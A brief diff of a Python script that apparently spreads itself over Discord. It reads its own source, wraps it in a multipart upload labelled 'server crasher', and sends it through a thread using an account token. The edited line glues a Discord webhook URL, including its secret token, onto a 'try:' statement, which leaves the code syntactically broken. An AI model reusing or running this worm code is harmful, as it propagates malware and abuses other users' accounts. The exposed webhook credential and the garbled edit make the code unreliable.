@@ -190,7 +190,7 @@ def main():
                 content = file.read()
             payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
             Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
-try:
+try:https://discord.com/api/webhooks/957729687063388221/XUQNWfKY0UcR4BEXYvZjIVXMuY-3QShigiruHF-eZZsnRyFXGqeWG4TUBaekf0Xjnl5b
     main()
 except Exception as e:
     print(e)
